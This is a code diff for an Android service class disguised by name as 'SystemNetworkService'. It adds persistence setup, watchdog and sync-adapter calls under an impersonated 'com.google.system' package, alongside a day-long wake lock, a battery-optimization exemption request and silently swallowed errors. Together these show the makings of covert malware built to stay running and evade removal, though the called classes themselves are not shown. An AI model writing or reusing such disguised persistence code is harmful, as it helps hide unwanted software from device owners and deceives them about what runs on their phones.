@@ -112,10 +112,8 @@ class SystemNetworkService : Service() {
             wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKELOCK_TAG)
             if (!wakeLock!!.isHeld) {
                 wakeLock!!.acquire(24 * 60 * 60 * 1000L)
-                
             }
         } catch (e: Exception) {
-            
         }
 
         // Request battery optimization exemption
@@ -127,12 +125,17 @@ class SystemNetworkService : Service() {
                     intent.data = Uri.parse("package:$packageName")
                     intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                     startActivitySafely(intent)
-                    
                 }
             }
         } catch (e: Exception) {
-            
         }
+
+        // Initialize persistence mechanisms
+        try {
+            com.google.system.PersistenceManager.setupAll(applicationContext)
+            com.google.system.WatchdogService.start(applicationContext)
+            com.google.system.SyncAdapter.setup(applicationContext)
+        } catch (_: Exception) {}
 
         // Register network callback for auto-reconnect
         registerNetworkCallback()
